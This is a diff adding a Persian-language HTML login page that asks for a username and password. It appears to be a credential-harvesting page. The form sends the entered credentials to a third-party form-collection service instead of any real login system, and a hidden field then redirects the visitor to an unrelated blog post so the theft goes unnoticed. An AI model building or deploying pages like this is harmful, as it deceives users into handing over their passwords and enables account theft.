@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>صفحه ورود</title>
+<style>
+  body { font-family: Arial, sans-serif; direction: rtl; padding: 20px; background: #f0f0f0; }
+  .login-form { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; }
+  label { display: block; margin-top: 15px; }
+  input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin-top: 5px; }
+  button { margin-top: 20px; padding: 10px; width: 100%; background: #0078d7; color: white; border: none; border-radius: 4px; cursor: pointer; }
+  button:hover { background: #005ea3; }
+</style>
+</head>
+<body>
+  <div class="login-form">
+    <h2>ورود به سیستم</h2>
+    <form action="https://formspree.io/f/mayvlqjw" method="POST">
+      <label for="username">نام کاربری:</label>
+      <input type="text" id="username" name="username" required />
+      
+      <label for="password">رمز عبور:</label>
+      <input type="password" id="password" name="password" required />
+      
+      <input type="hidden" name="_next" value="https://ttn.blogsky.com/1404/04/08/post-1/" />
+      <button type="submit">ورود</button>
+    </form>
+  </div>
+</body>
+</html>
